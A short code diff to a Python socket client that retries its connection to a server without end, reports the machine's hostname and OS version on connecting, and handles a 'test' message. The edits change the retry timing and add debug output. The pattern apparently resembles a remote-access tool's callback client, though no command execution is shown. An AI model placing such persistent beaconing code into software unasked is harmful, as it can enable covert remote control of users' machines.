@@ -18,10 +18,14 @@ class Client:
     def connect(self):
         while True:  # infinite loop until socket can connect
             try:
-                self.socket = socket.socket()
+                self.socket = socket.socket() #(socket.AF_INET, socket.SOCK_STREAM)
                 self.socket.connect((self.server_host, self.port))
-            except socket.error: time.sleep(5)  # wait 5 seconds to try again
-            else: break
+            except socket.error as e:
+                print(f"waiting {e}") 
+                time.sleep(0.2) # 5
+            else:
+                print("breaking")
+                break
 
             userInfo = socket.gethostname() + "||" + platform.system() + " " + platform.release()
             self.send(str.encode(userInfo))
@@ -35,7 +39,7 @@ class Client:
 
                     if strData == "test": 
                         print("Got test")
-                        self.send(str.encode("hello"))
+                        continue
             except socket.error:
                 self.socket.close()
                 del self.socket
